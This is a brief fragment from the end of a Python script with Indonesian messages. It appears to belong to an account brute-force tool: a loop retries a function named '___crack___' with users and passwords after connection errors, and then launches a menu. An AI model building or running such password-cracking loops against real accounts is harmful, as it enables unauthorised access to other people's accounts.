                ___crack___(total,user,pwx)
            else:
                continue
        loop +=1
    except (ConnectionError):
        emil("\r%s[%s!%s]%s Koneksi Error                "%(P,K,P,K)),
        sys.stdout.flush();sleep(3)
        ___crack___(total,user,pwx)
    except:
        pass

if __name__=='__main__':
#    os.system('git pull')
     ___menu___()


